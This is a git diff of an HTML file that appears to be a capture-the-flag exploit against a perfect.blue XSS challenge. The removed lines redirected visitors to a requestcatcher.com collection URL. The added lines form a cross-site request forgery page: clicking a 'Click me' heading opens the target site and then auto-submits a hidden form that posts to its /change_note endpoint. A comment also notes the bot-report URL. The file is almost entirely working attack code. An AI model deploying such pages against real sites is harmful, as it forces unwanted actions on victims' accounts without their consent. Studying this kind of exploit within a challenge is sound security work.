@@ -1,16 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
+<script>
+    function go() {
+        let w = window.open("https://tbdxss.chal.perfect.blue/", ''); // i dunno what to add here 
+        setTimeout(function () { w.close(); csrf.submit() }, 1000)
+    }
+</script>
 
-    <script>
-        document.location ='https://dsfasfsdfsdfsdf.requestcatcher.com/test' 
-         </script>
-    
-</body>
-</html>
+<h1 onclick=go()>Click me</h1>
+
+
+<!--
+https://tbdxss.chal.perfect.blue/do_report
+
+<form action="/change_note" id="noteform" method=POST>
+        <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content"></textarea>
+        <br>
+        <input type="submit" value="submit">
+        </form>
+
+-->
+
+<form style="display:none" name=csrf method=post id="noteform" action="https://tbdxss.chal.perfect.blue/change_note">
+    <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content" value="test"></textarea>
+    <input type="submit" value="submit">
+</form>
